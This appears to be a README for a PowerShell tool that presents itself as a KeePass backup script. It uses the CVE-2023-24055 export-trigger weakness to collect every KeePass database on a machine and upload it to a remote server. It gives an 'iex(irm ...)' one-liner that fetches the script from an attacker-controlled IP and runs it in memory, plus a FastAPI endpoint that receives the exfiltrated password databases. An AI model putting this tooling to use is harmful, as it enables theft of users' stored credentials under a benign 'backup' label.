# Invoke-KeePassBackup
This PowerShell script is designed to automate the process of sending KeePass databases to a specified endpoint. 🕊️

## Features
- Automatically locates the KeePass executable and ascertains its version.
- Adds an export trigger to the KeePass configuration if KeePass version is below 2.53 (a.k.a `CVE-2023-24055`).
- Backs up the current KeePass configuration before making changes.
- Scours all KeePass databases on the computer and uploads them to a given endpoint.
- Uses GZip compression for efficient backup size.
  
## Usage
Run the script using the following command:
```powershell
Invoke-KeePassBackup -url "https://backup.endpoint/u"
```

Knowing the real use-case, preferred running is from your own `HTTP(S)`/`WebDAV` server:
```powershell
$ip="192.168.45.218";powershell -nop -c "iex(irm http://$ip/Invoke-KeePassBackup.ps1); Invoke-KeePassBackup http://$ip/u"
```

The reception endpoint could resemble this FastAPI Python3 code snippet:
```python

@app.post("/u")
async def upload_file(x_file_name: str = Header(...), data: str = Body(...)):
    """
    Handle file upload via POST request.

    Args:
        x_file_name (str): The name of the file, from header.
        data (str): The body of the request containing the uploaded file's data.

    Raises:
        HTTPException: If the filename header is missing.
        HTTPException: If an error occurs during file upload.
    """

    if not x_file_name:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Provide a filename with Header 'X-File-Name'",
        )

    try:
        # Decode the base64 data
        decoded_data = base64.b64decode(data.encode("utf-8"))

        # Check if the data is gzipped by looking at the first two bytes
        if decoded_data[:2] == b"\x1f\x8b":
            # If gzipped, decompress
            buffer = io.BytesIO(decoded_data)
            with gzip.GzipFile(fileobj=buffer, mode="rb") as f:
                processed_data = f.read()
        else:
            # If not gzipped, just use the decoded data as is
            processed_data = decoded_data

        # Save the file
        save_file_content(file_name=x_file_name, data=processed_data)

        return {"status": "success", "message": f"Received {x_file_name}."}

    except Exception as error:
        logger.error(f"Error while processing upload: {error}")
        raise HTTPException(status_code=500)
```

## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
